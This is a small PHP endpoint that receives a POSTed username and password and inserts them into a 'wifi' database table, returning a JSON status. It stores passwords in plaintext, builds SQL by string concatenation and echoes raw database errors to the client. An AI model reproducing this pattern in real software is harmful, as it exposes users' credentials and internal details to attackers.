<?php
include('config.php');
// Check if the request method is POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username and password from the POST data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Sanitize the input (you should use a better sanitization method)
    $username = mysqli_real_escape_string($db, $username);
    $password = mysqli_real_escape_string($db, $password);

    // Define the SQL query to insert data into the "wifi" table
    $sql = "INSERT INTO wifi (id, pass) VALUES ('$username', '$password')";

    // Execute the SQL query
    if (mysqli_query($db, $sql)) {
        $response = [
            "status" => 200,
            "message" => "Data inserted successfully.",
        ];
    } else {
        $response = [
            "status" => 500,
            "message" => "Error: " . mysqli_error($db),
        ];
    }

    // Send a JSON response
    header("Content-Type: application/json");
    echo json_encode($response);
} else {
    // Invalid request method
    http_response_code(405);
    echo "Invalid request method.";
}
?>
